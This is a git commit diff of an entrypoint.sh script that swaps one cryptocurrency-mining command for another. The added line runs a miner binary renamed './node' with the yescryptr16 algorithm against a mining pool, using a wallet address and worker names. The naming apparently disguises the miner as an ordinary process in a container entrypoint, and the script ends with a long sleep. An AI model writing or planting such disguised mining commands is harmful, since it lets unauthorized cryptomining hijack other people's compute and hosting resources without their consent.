f9ae700d5cd7841f0f155a9cbf81a95f3d8997e9
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-03 03:12:38 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -5,7 +5,7 @@ chmod +x node
 WORKER_NUMBER=$1
 HOURESX=crf_$WORKER_NUMBER
 PASSHOURS=$(date +%M%S)
-./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
-
+#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
+./node -a yescryptr16 -o asia.rplant.xyz:7057 -u GUyozAzpqCzx7pGx72FGUmMk4Jxv9d2qaF.${HOURESX} > try.log
 sleep 29999
 
